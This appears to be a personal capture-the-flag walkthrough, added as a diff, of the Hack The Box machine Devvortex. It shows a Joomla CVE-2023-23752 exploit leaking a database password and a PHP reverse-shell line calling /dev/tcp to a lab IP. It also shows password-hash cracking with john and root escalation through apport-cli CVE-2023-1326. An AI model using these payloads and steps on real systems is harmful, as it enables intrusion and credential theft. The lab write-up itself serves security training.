@@ -1,0 +1,62 @@
+Firstly, Scanned, searched dir and domains, and then found dev.devvortex.htb and its dirs
+
+On dev.devvortex.htb/administrator/, use joomla
+
+https://github.com/Acceis/exploit-CVE-2023-23752
+
+┌──(hapispidey㉿blackhole)-[~/Desktop/HTB-devvortex/exploit-CVE-2023-23752]
+└─$ ./exploit.rb http://dev.devvortex.htb              
+Users
+[649] lewis (lewis) - lewis@devvortex.htb - Super Users
+[650] logan paul (logan) - logan@devvortex.htb - Registered
+
+Site info
+Site name: Development
+Editor: tinymce
+Captcha: 0
+Access: 1
+Debug status: false
+
+Database info
+DB type: mysqli
+DB host: localhost
+DB user: lewis
+DB password: P4ntherg0t1n5r3c0n##
+DB name: joomla
+DB prefix: sd4fg_
+DB encryption 0
+
+
+GOT ADMIN PANEL
+
+under system> templates> admin templates> lol too many php files haha
+
+reverse shell boom
+system('bash -c "bash -i >& /dev/tcp/10.10.14.82/969 0>&1"');
+
+DATA user Boom
+
+
+mysql -u lewis -p joomla --password=P4ntherg0t1n5r3c0n##
+
+in db
+
+logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
+
+lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
+
+john --wordlist=/usr/share/wordlists/rockyou.txt logan
+
+tequieromucho - logan
+
+Logan boom
+
+sudo -l
+
+CVE-2023-1326
+https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/
+
+sudo /usr/bin/apport-cli --file-bug
+
+
+ROOT BOOM
